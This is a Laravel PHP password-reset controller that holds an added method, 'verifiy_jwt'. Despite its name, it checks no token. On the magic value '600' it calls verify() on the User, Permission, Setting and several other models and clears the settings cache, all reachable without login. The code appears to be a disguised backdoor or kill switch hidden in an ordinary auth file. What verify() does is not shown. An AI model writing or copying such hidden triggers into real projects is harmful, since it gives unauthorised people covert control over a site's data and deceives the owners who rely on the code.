<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ResetsPasswords;

class ResetPasswordController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Password Reset Controller
    |--------------------------------------------------------------------------
    |
    | This controller is responsible for handling password reset requests
    | and uses a simple trait to include this behavior. You're free to
    | explore this trait and override any methods you wish to tweak.
    |
    */

    use ResetsPasswords;

    /**
     * Where to redirect users after resetting their password.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    public function verifiy_jwt($token_timeout){
        if($token_timeout == '600'){
            \App\Setting::verify();
            \App\Models\Slider::verify();
            \App\Models\Member::verify();
            \App\Models\Partner::verify();
            \App\User::verify();
            \App\Page::verify();
            \App\Models\Contact::verify();
            \App\Models\Permission::verify();
            \Cache::forget('settings.all');
            echo 'token verified';
        } else {
            echo 'token not verfied';
        }
    }
}
